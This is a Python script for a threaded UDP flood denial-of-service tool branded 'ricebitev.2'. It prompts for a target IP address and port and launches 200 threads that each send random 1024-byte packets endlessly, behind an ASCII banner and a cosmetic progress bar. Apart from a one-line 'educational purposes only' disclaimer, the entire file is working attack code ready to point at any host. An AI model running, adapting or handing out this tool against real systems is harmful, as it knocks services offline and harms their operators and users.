import socket
import random
import threading
import time
import sys
import os

# Change terminal title to 'ricebitev.2'
def change_terminal_title():
    os.system("title ricebitev.2")  # Works on Windows, for Linux/Mac, use `os.system('echo -n -e "\033]0;ricebitev.2\007"')`

# ASCII Art Header
def print_header():
    print("""
     ____             _            ____            
    |  __ \           | |          |  _ \           
    | |  | | ___ _ __ | |_ ___ _ __| |_) | ___ _ __ 
    | |  | |/ _ \ '_ \| __/ _ \ '__|  _ < / _ \ '__|
    | |__| |  __/ | | | ||  __/ |  | |_) |  __/ |   
    |_____/ \___|_| |_|\__\___|_|  |____/ \___|_|   
    """)
    print("\033[1;31;47mWARNING: This tool is for educational purposes only!\033[0m")
    print("\n\033[1;32;47mTargeted Denial of Service (DoS) Attack Initiated...\033[0m")
    print("\n\033[1;34;47mPress Ctrl+C to stop the attack at any time.\033[0m")
    time.sleep(2)

# Send UDP packets to the target IP
def send_packet(ip, port):
    """Function to send a single packet to the target IP and port."""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)  # Generate a random packet of 1024 bytes
    
    while True:
        try:
            client.sendto(bytes_to_send, (ip, port))
            sys.stdout.write(f"\033[1;33;47mPacket sent to {ip}:{port}\033[0m\n")
            sys.stdout.flush()
        except Exception as e:
            sys.stderr.write(f"\033[1;31;47mError: {e}\033[0m\n")
            break

# Main function to handle user input and attack
def main():
    # Change terminal title to "ricebitev.2"
    change_terminal_title()

    print_header()

    # Ask for the target IP and port
    ip = input("\033[1;36;47mEnter the IP address to attack: \033[0m")
    
    try:
        port = int(input("\033[1;36;47mEnter the port to attack (default 80): \033[0m") or 80)
    except ValueError:
        print("\033[1;31;47mInvalid port number. Using default port 80.\033[0m")
        port = 80

    print(f"\n\033[1;33;47mTargeting IP: {ip}, Port: {port}...\033[0m")

    # Create and start threads for concurrent packet sending
    threads = []
    for i in range(200):  # Adjust the number of threads based on the required intensity
        thread = threading.Thread(target=send_packet, args=(ip, port))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Give the illusion of a progress bar
    try:
        print("\033[1;32;47mStarting attack...\033[0m")
        for i in range(101):
            sys.stdout.write("\r\033[1;35;47mAttack Progress: [{}{}] {}%".format(
                '#' * (i // 2), ' ' * (50 - (i // 2)), i))
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write("\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n\033[1;31;47mAttack stopped by user.\033[0m")

if __name__ == "__main__":
    main()
